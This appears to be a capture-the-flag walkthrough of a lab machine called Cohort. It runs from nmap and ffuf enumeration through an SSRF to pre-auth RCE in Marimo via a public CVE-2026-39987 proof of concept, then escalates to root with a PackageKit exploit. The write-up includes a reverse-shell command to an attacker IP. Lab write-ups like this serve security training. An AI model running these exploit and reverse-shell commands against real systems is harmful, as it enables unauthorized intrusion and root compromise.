
<img src="Images/logo%20cohort.png" width="276" alt="logo cohort">
# Attack Chain



# Summary

---
# Enumeration
### nmap

```
nmap -sVC 10.129.98.50 -oA scan/nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2026-08-02 19:30 CEST
Nmap scan report for 10.129.98.50
Host is up (0.50s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
|_http-title: 400 The plain HTTP request was sent to HTTPS port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
echo '10.129.98.50 cohort.htb' | tee -a /etc/hosts
```

# Web

![default website cohort](Images/default%20website%20cohort.png)
### Directory Brute Force

```
ffuf -c -w `fzf-wordlists` -u "https://cohort.htb/FUZZ" -fc 200


api                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 272ms]
assets                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 272ms]
status                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 269ms]
```

Every response return 200 so we must filter to 301


![register report cohort](Images/register%20report%20cohort.png)
4 choices, CSV, JSON, NDJSON and PARQUET


### SSRF

![ssrf cohort](Images/ssrf%20cohort.png)

```
echo '10.129.98.50 nb-1be3782a8afd3ad5.cohort.htb' | /etc/hosts
```

# Marimo

![marimo cohort](Images/marimo%20cohort.png)


![version jupyter cohort](Images/version%20jupyter%20cohort.png)

### CVE-2026-39987 - Marimo Pre-Auth RCE

https://github.com/M3PH1569/CVE-2026-39987-POC

```
python3 CVE-2026-39987.py https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws "id" --no-check

<SNIP>

[+] Result:
============================================================
export LC_ALL=C
marimo@cohort:~$ export LANG=C
marimo@cohort:~$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

### Shell as marimo

```
python3 CVE-2026-39987.py https://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws --revshell 10.10.16.113 6767

<SNIP>

marimo@cohort:~$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

# Privilege Escalation

```
marimo@cohort:/opt/marimo$ dpkg -l | grep -i packagekit
ii  gir1.2-packagekitglib-1.0             1.2.8-2ubuntu1.5                                 amd64        GObject introspection data for the PackageKit GLib library
```


Vulnerable to Pack2Root

https://github.com/shibaaa204/Pack2TheRoot/blob/main/exploit.py

```
marimo@cohort:~$ python3 poc.py

.suid_bash-5.2# uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
```

> [!TIP]
> **Machine Rooted**

